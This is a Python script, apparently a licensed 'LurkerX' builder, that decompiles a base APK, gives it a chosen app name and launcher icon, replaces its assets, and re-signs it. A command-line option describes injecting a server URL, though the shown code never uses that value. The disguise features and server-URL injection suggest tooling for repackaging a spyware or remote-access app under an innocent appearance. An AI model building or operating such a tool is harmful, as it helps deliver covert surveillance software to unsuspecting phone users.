#!/usr/bin/env python3

import sys
import shutil
import subprocess
import re
from pathlib import Path
import platform
import argparse
from colorama import Fore

from helper import load_manifest, load_ini, clear_screen, type_text, get_colored_figlet
from validation import validate_token


# -------------------- ARGUMENTS ----------------------

def parse_args_and_validate():
    parser = argparse.ArgumentParser(description="LurkerX APK modifier")
    parser.add_argument("--token", required=True, help="Encrypted user token")
    parser.add_argument("--tool", default="LurkerX", help="Tool name to validate against")

    parser.add_argument("--name", required=True, help="New app name")
    parser.add_argument("--icon", required=True, help="Path to launcher icon (png)")
    parser.add_argument("--url", required=True, help="Server URL to inject into assets/url.txt")

    args = parser.parse_args()

    if not validate_token(args.token, args.tool):
        print("Error: Invalid or expired token.")
        sys.exit(1)

    print("Token is valid! Continuing...")
    return args


# ---------------------- PATHS ----------------------

BASE_DIR = Path(sys.argv[0]).parent.resolve()
IS_WINDOWS = platform.system() == "Windows"

APKTOOL = BASE_DIR / ("apktool.bat" if IS_WINDOWS else "apktool")
BUILD_TOOLS = BASE_DIR / "build-tools" / "35.0.1"

ZIPALIGN = BUILD_TOOLS / ("zipalign.exe" if IS_WINDOWS else "zipalign")
APKSIGNER = BUILD_TOOLS / ("apksigner.bat" if IS_WINDOWS else "apksigner")

WORK_DIR = BASE_DIR / "workdir"
OUTPUT_APK = BASE_DIR / "result/final.apk"


# ---------------------- HELPERS ---------------------

def run(cmd):
    subprocess.run([str(c) for c in cmd], check=True)

def safe_remove(p):
    p = Path(p)
    if p.exists():
        shutil.rmtree(p) if p.is_dir() else p.unlink()

# ---------------------- CORE LOGIC ---------------------

def modify_apk(
    app_name: str,
    app_icon: Path,
    server_url: str,
    base_apk: Path,
    keystore: Path,
    keystore_pass: str,
    keystore_alias: str | None):
    
    print(f"{Fore.YELLOW}[+]{Fore.RESET} Modifying APK: {Fore.GREEN}{app_name}{Fore.RESET}")

    safe_remove(WORK_DIR)
    if not base_apk.exists():
        raise FileNotFoundError(f"Base APK not found: {base_apk}")

    # decompile
    run([APKTOOL, "d", base_apk, "-o", WORK_DIR, "-f"])

    # replace launcher icons
    for d in ["mipmap-hdpi", "mipmap-mdpi", "mipmap-xhdpi", "mipmap-xxhdpi", "mipmap-xxxhdpi"]:
        target = WORK_DIR / "res" / d / "ic_launcher.png"
        if target.exists():
            shutil.copy2(app_icon, target)

    # modify the 1st activity label only
    manifest = WORK_DIR / "AndroidManifest.xml"
    if manifest.exists():
        text = manifest.read_text(encoding="utf-8")
        m = re.search(r"<activity\b[^>]*>", text)
        if m:
            tag = m.group(0)
            if "android:label" in tag:
                tag_new = re.sub(
                    r'(android:label\s*=\s*")[^"]*(")',
                    rf'\1{app_name}\2',
                    tag,
                    count=1
                )
            else:
                tag_new = tag.replace(
                    "<activity",
                    f'<activity android:label="{app_name}"',
                    1
                )
            text = text[:m.start()] + tag_new + text[m.end():]
            manifest.write_text(text, encoding="utf-8")

    # replace APK assets with BASE_DIR/assets
    apk_assets = WORK_DIR / "assets"
    src_assets = BASE_DIR / "assets"
    # remove existing APK assets
    if apk_assets.exists():
        shutil.rmtree(apk_assets)
    if not src_assets.exists() or not src_assets.is_dir():
        raise FileNotFoundError(f"Source assets directory not found: {src_assets}")
    shutil.copytree(src_assets, apk_assets)
    print(f"{Fore.GREEN}[+]{Fore.RESET} Assets replaced from {src_assets}")

    # rebuild
    run([APKTOOL, "b", WORK_DIR, "-o", OUTPUT_APK])

    aligned = OUTPUT_APK.with_name("final_aligned.apk")
    signed = OUTPUT_APK.with_name("final_signed.apk")
    #remove if exists
    safe_remove(aligned)
    safe_remove(signed)

    run([ZIPALIGN, "-v", "4", OUTPUT_APK, aligned])

    sign_cmd = [
        APKSIGNER, "sign",
        "--ks", keystore,
        "--ks-pass", f"pass:{keystore_pass}",
        "--out", signed,
        aligned
    ]

    if keystore_alias:
        sign_cmd[3:3] = ["--ks-key-alias", keystore_alias]

    run(sign_cmd)

    return signed


# -------------------- ENTRY ------------------

if __name__ == "__main__":
    clear_screen()
    args = parse_args_and_validate()

    manifest = load_manifest(BASE_DIR / "manifest.json")
    ini = load_ini(BASE_DIR / "config.ini")

    base_apk = Path(ini.get("decompile", "from"))
    keystore = Path(ini.get("sign", "keystore"))
    keystore_pass = ini.get("sign", "keystore_pass")
    keystore_alias = ini.get("sign", "alias", fallback=None)

    print(get_colored_figlet(BASE_DIR / "doom.txt"))
    type_text(f"Author: {manifest.get('author', 'Unknown')}\n", Fore.YELLOW)
    type_text(f"Version: {manifest.get('version', '1.0.0')}\n", Fore.CYAN)

    try:
        apk = modify_apk(
            app_name=args.name,
            app_icon=Path(args.icon),
            server_url=args.url,
            base_apk=base_apk,
            keystore=keystore,
            keystore_pass=keystore_pass,
            keystore_alias=keystore_alias
        )
        type_text(f"\nSigned APK ready: {apk}\n", Fore.GREEN)
    except EOFError:
        # non-interactive environment (ignore)
        pass
    except Exception as e:
        type_text(f"\n[ERROR] {e}\n", Fore.RED)
